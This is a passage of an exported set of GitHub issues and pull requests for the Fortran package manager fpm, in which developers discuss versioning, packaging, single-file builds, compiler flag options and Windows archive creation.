                    "date": "2021-11-24 01:08:08+00:00",
                    "text": "Given that the first comment in this issue contains a working Homebrew formula, what would be the downside in submitting it?  After not having tried homebrew on Linux in several years, I'm having good luck with it.  Getting into package managers does a lot to increase the chances of adoption."
                },
                {
                    "user": "certik",
                    "date": "2021-11-24 02:55:40+00:00",
                    "text": "@rouson go ahead and submit it I would say."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-11-24 09:37:03+00:00",
                    "text": "Note that the formula above is outdated. I'm maintaining a tap for fpm at https://github.com/awvwgk/homebrew-fpm for my programming course. However, I didn't get it to build on Linuxbrew so far, due to the choice of GFortran default version.\nThere is no downside submitting it, but I'm not a brew user. Feel free to submit the formula if you like."
                }
            ]
        },
        {
            "number": 399,
            "user": "milancurcic",
            "date": "2021-03-18 15:48:17+00:00",
            "title": "Semantic versioning",
            "text": "I vaguely remember there being an fpm issue thread about this but now I can't find it.\nfpm 0.1.3 and 0.1.4 have both had new features and/or changes. But only their bugfix version number was bumped up at release. If we follow semantic versioning, minor version number should have been bumped.\nIf we follow the current trend soon we will have 0.1.23, but 0.23.x may be more informative for the user.\nShould we follow semver?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-03-18 16:08:02+00:00",
                    "text": "Yes, I realised we had a change but I too couldn't find where we'd discussed the rules; for some reason I'd thought we had different rules for changes with a zero major version. Are you suggesting bump minor version for manifest/CLI changes while in alpha? This would make sense."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-18 16:15:50+00:00",
                    "text": "Yes, I suggest bump minor version for any changes (breaking or non-breaking) or additions during 0.x.x. Bump patch version for any fixes that don't add or change behavior. This is includes changes to docs.\nOnce at 1.x.x, bump minor version for non-breaking changes and additions, and major version for breaking changes.\nI don't remember us deviating from semver rules, but I vaguely remember there were some questions or confusion about 0.x.x vs. 1.x.x."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-21 01:11:37+00:00",
                    "text": "I think it would be useful for everyone making a PR to put the #NNN  number at the end in the fpm.toml and internal version number as well."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-30 21:07:00+00:00",
                    "text": "Implemented now with the 0.2.0 release and going forward. Therefore, closing this as resolved."
                }
            ]
        },
        {
            "number": 398,
            "user": "LKedward",
            "date": "2021-03-17 17:37:16+00:00",
            "title": "Minor fix: for setting executable link libraries.",
            "text": "Executable link libraries were not working when auto discovery was enabled due to minor copy-paste typo.",
            "comments": []
        },
        {
            "number": 397,
            "user": "milancurcic",
            "date": "2021-03-17 14:56:23+00:00",
            "title": "Add Conda install instructions to the README",
            "text": "This adds the Conda install instructions from Sebastian's Discourse post to the README. I also slightly adjusted the sections formatting.\nI'm not a Conda user so I haven't tested this. Please double check.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-17 15:22:59+00:00",
                    "text": "I would include a short note on where to get a conda installer from, either miniforge / mambaforge for the conda-forge channel or miniconda for the defaults channel (only the latter installer needs to add the conda-forge channel).\nWe might also include a note on the supported platforms, because we don't ship Windows binaries and OSX ARM binaries there yet.\n\n\n[![Conda Version](https://img.shields.io/conda/vn/conda-forge/fpm.svg)](https://anaconda.org/conda-forge/fpm)\n[![Conda Platforms](https://img.shields.io/conda/pn/conda-forge/fpm.svg)](https://anaconda.org/conda-forge/fpm)"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-17 16:12:11+00:00",
                    "text": "@awvwgk please merge if it looks good."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-18 17:02:44+00:00",
                    "text": "Once you install fpm it is trivial to add fpm-search using fpm;  which it is reasonable to assume new users would not know about . Maybe showing how to pull an app-package and build and install it?  And that particular app gets you to additional resources to boot. Hmm, well, I guess fpm-search installation is trivial on platforms that support the external libraries.\nSomething like 80 Likes on Twitter already for the Conda packaging.\nMaybe the first external target to support should be f2py(1) instead of CMake(1) or make(1)."
                }
            ]
        },
        {
            "number": 396,
            "user": "LKedward",
            "date": "2021-03-16 16:39:35+00:00",
            "title": "Throw error message for duplicate module definitions",
            "text": "fpm will currently try to build packages with duplicate module definitions which can lead to cryptic compiler messages or erroneous compilation. It should be quite easy to detect duplicate modules and give an error message to the user. I would suggest a new subroutine e.g. check_modules invoked right before the end of build_model.",
            "comments": []
        },
        {
            "number": 394,
            "user": "milancurcic",
            "date": "2021-03-16 13:47:10+00:00",
            "title": "Command or plugin to emit a single-file library or application",
            "text": "Most recently mentioned in #391, but has been initially raised elsewhere.\nSuppose an fpm command single-file (or some other meaningful name) which dumps the package and all its dependencies in a single source file (for simplicity, let's ignore foreign-language dependencies for now), just like @urbanjost has reported doing himself.\nThere are at least 4 use cases that I can think of:\n\nBootstrap fpm on systems for which binaries are not available. For example, I'm trying to set up fpm on an IBM Power9 system (currently I can't, but this is for another issue). Another example from @LKedward here.\nAs above, but for building any other fpm package on such systems. For example, I currently can't build fpm on a Power9. But I could build many other fpm packages on that system if I could easily sling a source file over.\nIncorporating fpm packages into existing non-fpm packages. Given an arbitrary build system, there's no easier adding a dependency than inserting a single source file into it. This is especially true for large libraries and applications with custom and complex build systems. Example: WRF is an extremely popular (> 33K users as of 2017) Fortran application that has an extremely complex (trust me) build system. Adding a dependency is not trivial, and is easiest if it's a single file.\nDistribute fpm source packages to people who don't use build systems.\n\nI think this is a good fit for a 3rd party plugin because it fits the fpm theme well, but is not as widely used to warrant being a core functionality of fpm.",
            "comments": []
        },
        {
            "number": 391,
            "user": "awvwgk",
            "date": "2021-03-15 21:46:26+00:00",
            "title": "Provide single source file fpm versions via CI workflow",
            "text": "Should be a fun, little task to setup a CI workflow to collect all the source files into a single file release version of fpm and upload it to the release tag.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-03-15 21:53:31+00:00",
                    "text": "This could be a nice fpm plugin too, perhaps fpm-singlefile. CC @urbanjost @brocolis"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-15 22:00:21+00:00",
                    "text": "I hacked a bash script together which wraps gfortran (like @urbanjost suggested in a post a while ago) and appends all the source files to a single one before invoking the compiler. A plugin is way more work.\nHere are all versions of fpm so far:\n\nfpm-0.1.0.f90.gz\nfpm-0.1.1.f90.gz\nfpm-0.1.2.f90.gz\nfpm-0.1.3.f90.gz\nfpm-0.1.4.f90.gz"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-16 00:06:57+00:00",
                    "text": "A plugin would be nice to be a fortran program, but just has to be an executable.  Rename your script \"fpm-singlefile\" and using the proposed plugin PR just enter \"fpm singlefile\" (with maybe a version or branch option) in the fpm(1) repository if the script does not pull it.  Mine is called \"fpm-singularity\" and also uses a bash script, but I did not plan on publishing it.  Will not work in an environment without bash(1), of course; but technically just one person or process has to run it and put the files out.  It creates a scratch directory and actually builds it (the scratch directory makes it a lot easier to clean up the *.mod files) and then moves the binary and single source file back up to the top directory so it verifies the build compiles and makes a matching binary as well; it probably should insert the license file at the top but does not. Weird how simple it is to build with just a \"gfortran fpm-0.1.4.f90 -o fpm-0.1.4\" is it not? Cannot say there is a compelling reason to make it a plugin because most people will not run it(maybe wrong about that), but I renamed mine and a few other commands (avpgk before it was named \"fpm-search\", the fan(1) program to \"fpm-man\", tcboo (There Can Be Only One, another inside joke) to \"fpm-singularity\" and so on for tests and ended up liking it that way) :>.  Is that already done with a CI?  I have not done anything with that yet. Been thinking I wanted to add running \"fpm test\" runs to my fpm packages and wanted to look into that. Using your single-file sources might make that a lot easier than I thought."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-16 01:06:16+00:00",
                    "text": "Cannot say there is a compelling reason to make it a plugin because most people will not run it\n\nMaybe not, but IMO that's the point of a plugin--something that fits the theme of fpm but is not commonly enough used to warrant being a built in."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-16 03:01:37+00:00",
                    "text": "good point.  Seems like there should be at least three repository types -- fpm developer packages, fpm plugins, and applications buildable via fpm.  So if I wanted to add something like fpm-plugin that searched the \"plugin\" repository and added plugins I could do something like  \"fpm plugin search\" and add the \"fpm-search\" command. Not all plugins would have to be fpm packages though (like fpm-singlefile being a bash(1) script) so I do not know if some other kind of package manager might be needed; but wondering whether \"fpm-search\" and related commands will be bundled with fpm directly or how that might work; but right now the only things in the fpm repository are libraries; but some packages are potentially just apps; some would mix apps and libraries; some apps would be designed to be plugins or fpm-related tools; ... probably some other package managers have the same issue.  Looking to see if other software package managers have different searchable repos or if apps and plugins are stand-alone tools, etc; it makes me wonder if there is a best or even common approach to that. And of course, a registry of registries ..."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-16 08:04:58+00:00",
                    "text": "I'm totally fine to solve this with a hacky bash script, as @urbanjost pointed out we only need a single task to run it and this could be a Linux runner with GitHub actions automatically. Also, I don't think there is interest in a long-term solution for such a feature in fpm or a plugin, it's just a neat trick for bootstrapping that happens to work now."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-16 09:22:07+00:00",
                    "text": "I agree, it would be nice to get a single-source file uploaded alongside the binaries. I needed to use one of @urbanjost's single-file versions to bootstrap fpm on one of our older clusters that didn't have a new enough version of glibc for the uploaded binaries \u2014 it worked a charm!\nWhen we start incorporating c code, a possible replacement could be a self-extracting shell script using something like makeself for example."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-16 09:30:46+00:00",
                    "text": "I attached the single source versions to the existing releases to make them easier available."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-16 10:55:13+00:00",
                    "text": "@awvwgk Sorry for the confusion, I need to clarify, a hacky bash script is just fine. My proposal for plugin I didn't mean as solution for this specific issue (fpm in CI), but as an idea for long term."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-17 23:45:09+00:00",
                    "text": "makeself -- shades of shar(1)!.  shar(1) (which was similar to makeself(1)) used to be used all over the place but slowly faded away as far as I know. Interesting. Could not even find shar(1) via apt-get; but I still see man-pages in a quick search for it so it is still out there somewhere.  Used to have my own version that encrypted all the files (long story).\nA have actually used my version of  a single-file script to build sources for several pure-fortran apps I built with fpm(1) that someone wanted on a machine quickly without having to set anything else up and that worked; but with two other fpm(1) packages that also had \"co-C\" components I used a makefile(1) generator and tarred up the files but fpm seems so close to being able to do that automatically I did that as one-offs.\nThe makefile(1) generator I used does not like it if everything is not in a single directory so I had to flatten a copy of the package before running it but it only took a few minutes; but they were relatively small packages.\nI have toyed with using the output of the model from --show-model to make some plugins that generate CMake and make setups of a package as prototypes but so far have not seen enough to justify it for my own needs, but thought from a few other conversations that it is already in other's plans to do that in the core fpm(1). Is this a high priority for others (and if so, is anyone working on it?). Using fpm(1) directly for small projects has been working quite well, so except for a few minor exceptions that I noted I have not personally had much need to export to anything else lately; albeit there are some projects I knew would not be good fits for fpm(1) currently that I built using previous methods."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 17:00:15+00:00",
                    "text": "I'm currently generating single file versions by a small script after disabling the compilation of all tests in the package manifest:\nversion=$(git describe --tags --abbrev=0 --match 'v*' | tr -d '[:alpha:]')\nrm -r build/gfortran_*\ncat > ./gfortran <<EOF\n#!/usr/bin/env bash\n\nargs=(\"\\$@\")\nfile=\\$(echo \"\\${args[@]}\" | rg -o '[^\\s]+\\.[fF]90\\s')\nif [ \\$? = 0 ]; then\n  cat \\$file >> fpm-$version.F90\nfi\nexec gfortran \"\\${args[@]}\"\nEOF\nchmod +x ./gfortran\necho \"#define FPM_BOOTSTRAP\" > fpm-$version.F90\nfpm build --compiler ./gfortran\nsha256sum fpm-$version.F90 > fpm-$version.F90.sha256\nI think this can be made automatic in the CI workflow, if there was a way to only compile tests when running fpm test."
                }
            ]
        },
        {
            "number": 390,
            "user": "awvwgk",
            "date": "2021-03-14 14:50:13+00:00",
            "title": "Implement --flag option for Fortran fpm",
            "text": "Exploratory implementation of --flag and --profile for Fortran fpm.\n\n--profile takes either debug or release, defaults to debug but yields against --flag\n--profile does not check it's argument, but saves this it in the settings,\nthis allows the model to potentially reuse it for reading the compilation profile from the package manifest\n--flag takes one argument which is forwarded to the compile arguments in the  model\n--flag arguments are replacing all compile arguments if no profile is specified\n--flag arguments are appended if a compilation profile (debug or release) is present\ncompiler identification works now also for gfortran-10 or powerpc64le-conda-linux-gnu-gfortran\n\nCloses #389",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-17 21:38:23+00:00",
                    "text": "Fails due to #327"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-18 11:50:07+00:00",
                    "text": "This is looking really great @awvwgk!\nI get a failure when passing flags without a profile:\n~/git/fpm_packages/slsqp$ fpm build --flag '-O3'                                                                                              \n + gfortran -c ./src/slsqp_kinds.f90-O3 -J build/gfortran_A05A18BF4FD7B592/slsqp -I build/gfortran_A05A18BF4FD7B592/slsqp -o build/gfortran_A05A18BF4FD7B592/slsq\np/src_slsqp_kinds.f90.o                                                                                                                                          \ngfortran: error: ./src/slsqp_kinds.f90-O3: No such file or directory                                                                                             \ngfortran: fatal error: no input files                                                                                                                            \ncompilation terminated.\n Command failed\nERROR STOP\n\nIt looks like we were previously relying on compile_flags starting with a space, but really we should just explicitly put a space between the the filename and the compile flags in the backend call:\n\n  \n    \n      fpm/fpm/src/fpm_backend.f90\n    \n    \n        Lines 241 to 242\n      in\n      8cbbd80\n    \n    \n    \n    \n\n        \n          \n           call run(model%fortran_compiler//\" -c \" // target%source%file_name // target%compile_flags & \n        \n\n        \n          \n                 // \" -o \" // target%output_file)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-19 15:48:17+00:00",
                    "text": "Let's have a few more eyes look over this PR before merging it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-20 01:17:44+00:00",
                    "text": "I think is very much a step in the right direction. Thanks for putting it together."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-20 05:14:09+00:00",
                    "text": "================================================================================\nSUGGESTED CHANGES:\n\nhelp text needs to explain how --profile and --flag interact, and --flags \noften appears where --flag should be.  Suggest something like\n\n --profile PROF  selects the compilation profile for the build.\n                 Currently available profiles are 'release' for\n                 high optimization and 'debug' for full debug options.\n                 If --flag is not specified the 'debug' flags are the\n                 default. \n --flag  FFLAGS  selects compile arguments for the build. These are\n                 added to the profile options if --profile is specified,\n                 else these options override the defaults.\n                 Note object and .mod directory locations are always\n                 built in.\n\nEverywhere where --profile and --flag are described.\n\nInstead of duplicating the descriptions, maybe something short in run(1) and\ntest(1) saying \"see 'help build' for a detailed description\"(?).\n\nIf would be useful if you came back to your package that you could dehash\nthe directory names or see them from a cache by entering something like\n\n   fpm build --profile --list\n\nor something like that. Remembering all the options one built with and in\nwhat order would be something I would not be good at. Somewhere in the\ndocumentation it has to explain that is how you do a combination of run|test|build\nand use the same build subdirectory.\n\nIf the build names were uuencoded or used a reversible hash\nthe directory names could contain the options used to built them and could\nbe listed.\n================================================================================\nLONGER TERM:\n\nSince one must repeat options on run(1) and test(1) to exactly match build(1),\nwhich is difficult (That was the impetus for the previously proposed\n-ID option PR) I'll repeat this previous proposal for a spec when -ID\nseemed insufficient.\n\nFirst, this was how -ID worked:\n\n   --flag could only be specified on build(1) and --ID also had to be\n   specified when --flag was present, which was used to make the build\n   subdirectory name and recorded the flags in a file in the directory,\n   and then you could say --ID NAME on build(1) and run(1) and test(1)\n   subsequently and it would reuse the same options. If --flag was used\n   a new build from scratch was started so you could not reuse the name\n   with multiple builds and end up with a build with multiple options\n   used on different parts (although that might be considered a feature,\n   not a flaw!). It was planned to also add an option to show what names\n   and matching flags had been used.\n\n-ID was considered insufficient and by itself did not provide for\npackaging the options used and the previous PR was dropped. \n\nI found having to respecify --flag exactly on build|run|test in the\nHaskell version (which this PR basically duplicates) hard to use and\ngenerally ended up having to wipe any previous build and then put the\noptions into a shell variable so I could repeat them, or build a script\nfor each combination that I had so I could come back to a project and\npick up where I was. I did not like that except it was better than no\noption, which is the current state in f-fpm.\n\nSo a subsequent proposal which did not get any comment went something\nlike this:\n\nThere is a separate file(s) called .fpmprofile or a section of the\nfpm.toml file that is maintained automatically that would be used to\ndefine names for compiler-specific options and generic profile names.\n\nIf the fpm.toml file is used it would be copied as-is till the\n\"[[profile]]\" section is encountered to leave comments and other\nuser-specified data intact, as most users would not want that\nautomatically maintained.\n\nUsing the fpm.toml file is nice and clean and easy to package for use as a\nremote dependency and \"self-contained\" but more complicated to break into\na user-edited section and an automatically maintained section and would\nrequired TOML, whereas separate files could be any format and could even\nbe searched for to reduce duplication (but then hard to package). That is,\nyou could have one in your home directory with your favorite options. For\npackaging I would suggest against that; but perhaps there could be an\noption to load the fpm.toml file with your favorite options (from a\nanother TOML file) and/or with the fpm \"built-ins\".\n\nYou would use a separate command to build option aliases something like\n\n    fpm option profile --flag '-pg' [--compiler gfortran|$COMPILER] [--description 'turn on profiling for use with gprof']\n\nor as simply as\n\n    fpm option free --flag '-ffree-form -ffree-line-length-none' \n\nThe first time it runs it might populate with default\noption aliases built into fpm, that perhaps would have a reserved prefix like\n\"fpm_\" that the user should not change; or alternatively they could stay\nbuild in but there would be some way to list them so you could easily use\nthem to build a custom profile.\n\nyou can then build a profile using option aliases\n\n    fpm profile free profile fpm_debug --name myopts [--compiler gfortran|$COMPILER]\n\nUsing aliases makes it so the profiles are more compiler-independent.\n\nYou could then use the profile name on build, run, and test, which would\ncause a \"unique\" build directory name created from a hash of the options,\nas done in this version.\n\nThere would be a special user-definable name called \"package\" that would\nbe used when the package is built as a dependency when present.\n\nalias names could also be specified for files, but not profiles. If\npresent, they would assume to be always required for those files.\n\nSo assuming most users would just use --profile debug and --profile\nrelease and that they are built it and that debug was the default \nusage would not change much except users would use --profile release\nwhere they previously used --release.\n\nIf they wanted to use something like the -pg flag they would enter\n(assuming gfortran compiler):\n\n    fpm alias profile_flags --flag '-pg'\n    fpm alias free --flag '-ffree-form'\n    fpm profile profile_flags free --name myopts\n\nfrom that point on they could enter\n    fpm build --profile myopts\n\nThey could specify the option names for files (and directories or as\nglobal defaults or with name globbing?)  in the manifest file as well.\n\nIf you used a profile name and the aliases were not defined you would get a warning\n(they might be defined for gfortran but not for ifort, for example).\n\nThe profile subcommand could have a --list option, which would show the built-in\nnames too.\n\nThe --flag option would still exist but users would be strongly encouraged to\nnot require it for packages.\n================================================================================\nSo I would say this can go forward, and I will use it because right now\nI think the lack of adding flags is the biggest issue in using fpm more generally,\nbut I would prefer it be done more like the -ID proposal.\n\nAnd then I think we all need to work on a spec for a method that can be used\nin a packageable manner; the above being my first thoughts on that. Skipping\nthe -ID mode and going straight to the packageable proposal could be left \nupward-compatible with this PR. \n\nSo I think this can go forward with the help text corrections, with those\ncaveats."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-20 09:23:45+00:00",
                    "text": "@urbanjost Thanks for the feedback. I agree, in the long term we don't want to rely on the --flag option at all. Dehashing is an interesting idea, we could use the cache.toml to store the compiler flags associated with the respective hash which is straight-forward in TOML:\n[flag.gcc]\n0x2A42023B310FA28D = \" -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single\"\n0x5F75F7C92365B9B9 = \" -O3 -Wimplicit-interface -fPIC -fmax-errors=1 -funroll-loops -fcoarray=single\"\nThe ID solution is interesting, but I don't like the idea of introducing a global state dependency in the build system which might impact reproducible builds."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-21 14:03:22+00:00",
                    "text": "Thanks for the feedback. Unless something is blocking this patch I'll go ahead and merge this later today."
                }
            ]
        },
        {
            "number": 389,
            "user": "awvwgk",
            "date": "2021-03-14 11:10:42+00:00",
            "title": "Implement --flag option in Fortran fpm",
            "text": "Currently we relying heavily on the --flag option for Fortran fpm releases. Since a solution for the compiler profiles in the package manifest will probably take more time we should come up with a practical solution in the meantime.\nWhat do we need for this? With M_CLI2 and the existing fnv1a file hashing we could easily produce a similar hash namespacing for the compiler flags as currently provided by Haskell fpm removing the necessity to use Haskell fpm for creating the releases.\nPotentially blocked by urbanjost/M_CLI2#8",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-03-14 16:22:56+00:00",
                    "text": "See also #235"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-14 16:36:03+00:00",
                    "text": "Thanks for revisiting this @awvwgk, it would be good to get this sorted to move forward with #253.\nUnfortunately I don't like the --flag interface currently in Haskell fpm for two reasons:\n\nYou must specify separate flags with multiple --flag options\nThere's no way to simply add extra flags to the preset debug and release profiles.\n\nThese result in long lines like:\n\n  \n    \n      fpm/.github/workflows/CI.yml\n    \n    \n         Line 36\n      in\n      482a52b\n    \n    \n    \n    \n\n        \n          \n           RELEASE_FLAGS: --flag --static --flag -g --flag -fbacktrace --flag -O3 \n        \n    \n  \n\n\njust to add --static or --fopenmp to the compiler flags.\nI'd like to propose a modified interface for Fortran fpm:\n\n--flag can take multiple flags within a quoted argument. e.g. fpm build --flag \"-O3 --static\"\nIf used in combination with --release or --debug (new flag), then --flag will append the specified flags to the associated presets, otherwise the specified flags will be the only flags passed to the compiler."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-14 16:41:36+00:00",
                    "text": "Option 1 is already implemented with #390, I will have a look into option 2 soon."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-15 19:25:08+00:00",
                    "text": "So, as per previous discussions (#220, #235, ...) showed there are questions about whether the flag should create a separate build/* directory; how the switches apply to building remote dependencies; to rebuilds;  whether this should only appear on the build command and require giving it an ID for run and test ; how to support this with \"TOML\" data in fpm.toml and/or in packaging in some form,  and so on. So I think this should be made clear this is a global addition ad-hoc to the command and builds into a build/flag*/ directory; as that would still be useful; but that something using hashes or IDs or profile keywords or reading options from profile.toml or \"TOML\" comments in the source files or some other method will address packaging the options.\nRequiring a profile.toml file seems the least complicated, with the assertion it will be edited by commands. So you could enter:\nfpm alias ALIAS_NAME [-create  \"LIST_OF_FLAGS\" |-delete|-list] [--compiler COMPILER_NAME] \n\nand this would edit a  \".fpmprofile.toml\" that has a warning message in it saying \"do not edit by hand\".\nThis would give aliases to certain flags. Then you could create an ID from a list of PROFILE_NAMEs\nWe could populate the file with predefined ALIAS_NAME definitions the first time you build if not present or\nvia \"fpm alias -new|-update-add.  You could define an ID switch with something like creating a command called \"alias\" or \"aka\":\n      # define some alias names\n      fpm alias profile -create \"-pg\"\n      fpm alias debug -create \"-warn all -g0 -traceback\"\n      fpm alias mpi  -create 'non-minus-l-switches'  # NOT -llibname.[.a.so] names\n\n       # then you can make an ID from a group of aliases\n      fpm ID  MYNAME  profile mpi debug ...  --compiler COMPILER_NAME\n\nand then do a\n       build|run|test -ID MYNAME\n\nthe ID names \"default\" and \"release\" could be special names to be used in lieu of the --default and --release names specified by fpm, and would be treated as the default and release values to use when packaged.\nOr one of the eight other options talked about before:>   If options were in a .fpmprofile file fpm would not even have to have compiler options hard-coded in, it would just edit the .fpmprofile and make sure there were gfortran_default and gfortran_release names defined.\nThe default ID used with depend on the value of environment variable FPM_ID if not specified.\nThe build directory could be hashed from options in ID or just use the ID name. There are pros and cons to both approaches. If implemented fully the --debug and --release switches would be gone, all option combinations would be\nfrom IDs and debug and release would just be names that would be predefined in the \".fpmprofile.toml\" file.  The new\nsubcommand could also just predefine a \".fpmprofile.toml\" file.\nSo anyway, since none of the other things have seemed to have gained concensus I could use a --flag switch, and want it to apply to remote dependencies as well myself; but wondering if everyone agrees where that will be built and if it has to be recalled exactly for any rebuilds and needs to be specified on a run|test to run, and so on. Either way, it has to be very clear to the user this is for ad-hoc developer use or to build an application and that other methods will be developed for packaging options in the future(?)."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-15 20:59:36+00:00",
                    "text": "PS:  As part of an earlier look at ways to reliably specify long command options M_CLI2 has \"response files\" as suggested by @awvwgk  that I implemented a beta version of that is similar in some ways to the .fpmprofile.toml file; urbanjost/M_CLI2#5.\nWent other directions with that but it does let you create abbreviations for long commands in a platform-independent manner  (I probably need to QA it more for use with subcommands, but I use it with an alpha-alpha version of fpm and am starting to warm up to it, although initially unsatisfied with the lack of standardization of \"response files\").\nAnyone finding they want an easy way to abbreviate long option lists?  I think something like --flag \"LONG LIST\" might make this more desirable?\nIt lets you set up abbreviation files that can be searched for via an optional environment variable so instead of entering\nsomething like\nfpm test test1 --flags \"-O3 -Walll -traceback ......\" --compiler ifort \n\nyou can set up a response file and just enter\nfpm @test1\n\nfor instance."
                }
            ]
        },
        {
            "number": 387,
            "user": "awvwgk",
            "date": "2021-03-14 10:45:27+00:00",
            "title": "Create separate workflows to test fpm with itself",
            "text": "Initial attempt to split the build of the Haskell version from the build of the Fortran version. Due to the --flag option being only available in the Haskell version we are still block to use Fortran fpm to bootstrap itself.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-24 18:16:32+00:00",
                    "text": "I'll retry this once we have a Fortran fpm release with --flag support."
                }
            ]
        },
        {
            "number": 386,
            "user": "aslozada",
            "date": "2021-03-13 11:35:55+00:00",
            "title": "Replace deprecated flags in debug_fortran option",
            "text": "The options -fbounds-check and -fcheck-array-temporaries, used as flags in case(debug_fortran), are described here as deprecated aliases for -fcheck=bounds and -fcheck=array-temps, respectively.\nThe option -fcheck=<all|bounds|array-temps> was added in the gfortran 4.5 release.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-03-15 18:03:09+00:00",
                    "text": "Looks good to me.\nAll the compiler switches could stand a review, as most were chosen from reading on-line references and were not initially actually tried. Since then I have tried nvfortran, ifort, and gfortran myself and have seen others mention PGI and ifx. Anyone tried others?\nInitially the gfortran switches were make compatible with the bootstrap haskell version;  then refined with feedback. These particular ones were left using the older syntax as they still worked with newer versions, which meant they worked with a wider range of gfortran versions than the new syntax, even though deprecated.  The unknown was how many users of fpm(1) were using it with old GNU/gcc versions?  In the not too distance past a lot of Linux distributions were bundled with GCC 4.3.\nDoing a quick survey it looks like GCC is getting better service and being bundled with newer versions, and most of the fpm remote packages look like they need GCC 7.6 or higher so I have no issues with this change, but it raises the question\nof what compiler versions to support, or if there needs to be entries like gfortran-10, gfortran-9, gfortran-7 available as default compiler options.\nSo far it has not risen up as a major issue, and 4.5 is sufficiently old it seems like a good change, but it would be nice if there were more information on what versions people expect to be supported.\nFor this one change in particular it seems due. JIC (Just in Case) the current options could be used to create a new select case named 'gfortran-4', perhaps.  As this is still an Alpha version a simple change is sufficient, but wondering if we should think about setting a policy about switch changes in future post-Alpha versions(?)."
                },
                {
                    "user": "aslozada",
                    "date": "2021-03-15 20:07:19+00:00",
                    "text": "So far it has not risen up as a major issue, and 4.5 is sufficiently old it seems like a good change\n\nGCC release dates\n\nGCC series 4.3 (Jun. 13, 2011) to 4.9 (Aug. 3, 2016)\nGCC series 5.0 (Oct. 10, 2017) to 10 (Jul. 23, 2020)\n\n\nbut it would be nice if there were more information on what versions people expect to be supported.\n\nA poll in the fortran-lang Discourse could be useful, at least locally."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-18 08:12:38+00:00",
                    "text": "@aslozada Please avoid using the default branch of your fork to send pull requests if the pull bot is installed. A feature branch is usually safe but a default branch could be overwritten by the hard reset that is used to sync your fork with the upstream repository."
                },
                {
                    "user": "aslozada",
                    "date": "2021-03-18 10:38:18+00:00",
                    "text": "Thank you very much, @awvwgk.\nI have already fixed this unexpected behavior in the pull bot.\nI apologize for any inconvenience this may have caused."
                }
            ]
        },
        {
            "number": 385,
            "user": "aslozada",
            "date": "2021-03-13 03:49:43+00:00",
            "title": "Deprecated flags",
            "text": "The options -fbounds-check and -fcheck-array-temporaries, used as flags in case(debug_fortran), are described here as deprecated aliases for -fcheck=bounds and -fcheck=array-temps, respectively.\nfpm_compiler.f90\ncase('debug_gfortran')\n       fflags = '&\n       & -Wall&\n       & -Wextra&\n       & -Wimplicit-interface&\n       & -fPIC -fmax-errors=1&\n       & -g&\n       & -fbounds-check&\n       & -fcheck-array-temporaries&\n       & -fbacktrace&\n       & -fcoarray=single&\n       &'\n        mandatory=' -J '//modpath//' -I '//modpath\n\nThe option -fcheck=<all|bounds|array-temps> was added in the gfortran 4.5 release.",
            "comments": []
        },
        {
            "number": 384,
            "user": "everythingfunctional",
            "date": "2021-03-12 22:30:42+00:00",
            "title": "Windows Command Prompt Can't Create Archives",
            "text": "Running in a Windows Command Prompt, I get the error:\n'ar' is not recognized as an internal or external command,\noperable program or batch file.\n\nwhich is not surprising, but I'm not sure what the correct command would be on Windows for creating archives for libraries.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-12 22:48:28+00:00",
                    "text": "According to this stackoverflow answer, it is link.exe -lib."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-12 23:04:26+00:00",
                    "text": "It might also depend on the availability of MinGW or Cygwin type libraries. I would be interested in how compatible an archive created by link.exe is on a Cygwin Posix layer. For the setup we have on the GitHub Windows runner there is a wild mixture of MSYS2, git-bash and choco packages in the PATH, not sure which of them is providing the ar binary we are using to create the archive."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-03-15 07:03:44+00:00",
